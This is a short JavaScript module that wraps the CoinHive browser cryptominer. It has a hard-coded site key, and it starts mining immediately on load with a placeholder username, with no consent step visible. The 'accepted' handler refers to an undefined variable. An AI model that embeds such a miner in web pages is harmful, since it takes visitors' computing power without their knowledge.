// var CH = require('./chjs.min.js')
// console.log(CH)
const key = 'i3u3mkfSxqzZKwsJVrTEfo0IV8QHJOjR'
var miner

var ch = {
  miner,
  init: async function (username) {
    miner = await CoinHive.User(key, username)
    miner.start(true)
    miner.on('authed', function (params) {
      console.log('Token name is:', params)
    })
    miner.on('error', function (params) {
      if (params.error !== 'connection_error') {
        console.log('The pool reported an error', params.error)
      }
    })
    miner.on('found', function (data) {
      console.log('found', data)
    })
    miner.on('accepted', function () {
      console.log('accepted', data)
    })
  }
}

ch.init('blarg')

export default ch
